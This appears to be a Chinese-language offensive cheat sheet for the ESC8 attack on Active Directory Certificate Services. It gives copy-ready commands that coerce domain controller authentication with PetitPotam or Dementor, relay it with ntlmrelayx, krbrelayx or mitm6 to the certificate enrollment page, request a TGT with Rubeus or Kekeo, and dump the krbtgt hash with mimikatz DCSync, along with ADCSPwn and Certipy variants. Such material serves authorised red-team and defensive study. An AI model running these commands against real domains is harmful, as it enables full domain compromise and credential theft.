	攻击者可以使用 PetitPotam 触发域控制器，将 NTLM 凭据中继到选择的主机。然后可以将域控制器的 NTLM 凭据中继到 Active Directory 证书服务 (AD CS) Web 注册页面，并且可以注册 DC 证书。然后，此证书可用于请求 TGT（Ticket Granting Ticket）并通过 Pass-The-Ticket 破坏整个域。
	https://github.com/SecureAuthCorp/impacket/pull/1101
  #### NTLM 中继 + Rubeus + PetitPotam
  ```bash
impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate
对于成员服务器或工作站，模板为 "Computer".
其他模板：工作站、域控制器、机器、KerberosAuthentication

使用 petitpotam 通过 MS-ESFRPC EfsRpcOpenFileRaw 函数强制进行身份验证
您还可以使用任何其他方式通过 MS-RPRN 强制进行身份验证，例如 PrintSpooler
git clone https://github.com/topotam/PetitPotam
python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>
python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local

使用带有 rubeus 的证书来请求 TGT
Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt

现在您可以使用 TGT 执行 DCSync
mimikatz> lsadump::dcsync /user:krbtgt
```
  #### NTLM 中继 + Mimikatz + Kekeo
``` bash
impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

Mimikatz
mimikatz> misc::efs /server:dc.lab.local /connect:<IP> /noauth

Kekeo
kekeo> base64 /input:on
kekeo> tgt::ask /pfx:<BASE64-CERT-FROM-NTLMRELAY> /user:dc$ /domain:lab.local /ptt

Mimikatz
mimikatz> lsadump::dcsync /user:krbtgt
```
  #### Kerberos 中继
	>sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine
	>sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
  #### DCSPwn - 需要WebClient在域控制器上运行的服务。默认情况下未安装此服务。
  	https://github.com/bats3c/ADCSPwn
	>adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]
	>adcspwn.exe --adcs cs.pwnlab.local
	>adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
	>adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
	>adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local
  #### Certipy ESC8
  	>certipy relay -ca 172.16.19.100